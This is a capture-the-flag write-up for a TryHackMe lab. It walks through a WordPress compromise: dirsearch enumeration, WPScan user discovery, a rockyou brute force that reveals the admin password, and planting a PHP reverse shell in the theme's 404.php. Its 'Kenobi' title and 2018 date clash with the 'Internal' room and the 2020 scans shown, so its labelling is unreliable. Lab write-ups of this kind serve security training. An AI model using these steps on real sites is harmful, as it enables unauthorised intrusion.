---
title:  "TryHackMe - Kenobi Writeup"
search: true
categories: 
  - TryHackMe
last_modified_at: 2018-02-19T08:05:34-05:00
---

# Enumeration

As always we start with a port scan to reveal open ports on the network.
**AutoRecon:**
![alt text](https://i.imgur.com/Ilozm59.png "AutoRecon Scan")

AutoRecon shows us that port 22 (SSH) is open and port 80 (http) is open.

Let's see what's running on port 80: 
![alt text](https://i.imgur.com/YkYeryJ.png "Webpage")

Looks like a default apache welcome page is running. We should probably enumerate the directories to find some more information about the application.

**Dirsearch:**
```
python3 dirsearch.py -u http://10.10.151.247 -e *

[22:36:14] 301 -  313B  - /blog  ->  http://10.10.151.247/blog/                                                   
[22:36:16] 200 -    4KB - /blog/wp-login.php                            
[22:36:30] 200 -   11KB - /index.html                                                                          
[22:36:31] 301 -  319B  - /javascript  ->  http://10.10.151.247/javascript/
[22:36:42] 301 -  319B  - /phpmyadmin  ->  http://10.10.151.247/phpmyadmin/                             
[22:36:44] 200 -   10KB - /phpmyadmin/  
```
Dirsearch found multiple directories that we can now work with. Visiting the `/blog` directory brings us to a wordpress installation.
![alt text](https://i.imgur.com/cWSf8Bw.jpg "WordPress Installation")

`/blog/wp-login.php:`
![alt text](https://i.imgur.com/6c0yC44.png "Login Portal")

Navigating around the blog doesn't seem to provide any value. The next step in this enumeration phase is to find a valid user that we can login with to gain access to the WordPress Admin Panel.


**WPScan:**
```
root@kali:~/Desktop/THM/Internal# wpscan --url http://10.10.151.247/blog --enumerate u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://10.10.151.247/blog/ [10.10.151.247]
[+] Started: Mon Aug 24 22:44:56 2020

Interesting Finding(s):

...

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=====================================================================================> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] admin
 | Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 | Confirmed By: Login Error Messages (Aggressive Detection)

```

We found a valid user: `admin`

Let's use WPScan again to bruteforce the login page and gain administrative accesss to the CMS.

```
root@kali:~/Desktop/THM/Internal# wpscan --url http://internal.thm/blog/ --passwords /usr/share/wordlists/rockyou.txt --usernames admin
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.1
       Sponsored by Automattic - https://automattic.com/
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[+] URL: http://internal.thm/blog/ [10.10.151.247]
[+] Started: Mon Aug 24 22:57:09 2020

Interesting Finding(s):

[+] Performing password attack on Xmlrpc against 1 user/s
[SUCCESS] - admin / my2boys                                           
```

`/blog/wp-admin/`
![alt text](https://i.imgur.com/6hITmCC.png "Admin Panel")

Now that we have administrative access to the wordpress installation we can upload php code to the server to gain a remote shell on our attacker machine. Head over to `http://internal.thm/blog/wp-admin/theme-editor.php` and place a [PHP Reverse shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) into the `404.php` template.
![alt text](https://i.imgur.com/Byq9Zuk.png "Reverse Shell")

Now click 'Update File' and execute the PHP reverse shell. By visiting the following URL http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php. 




